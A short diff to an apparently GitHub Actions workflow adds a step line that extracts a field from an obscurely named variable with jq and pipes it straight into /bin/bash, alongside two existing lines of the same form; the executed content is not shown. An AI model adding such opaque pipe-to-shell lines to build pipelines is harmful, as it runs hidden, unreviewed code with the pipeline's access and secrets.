@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$g2" | jq -r .v40482 | /bin/bash
           printf '%s' "$y5" | jq -r .gtp121 | /bin/bash
+          printf '%s' "$ttff409" | jq -r .sff2 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
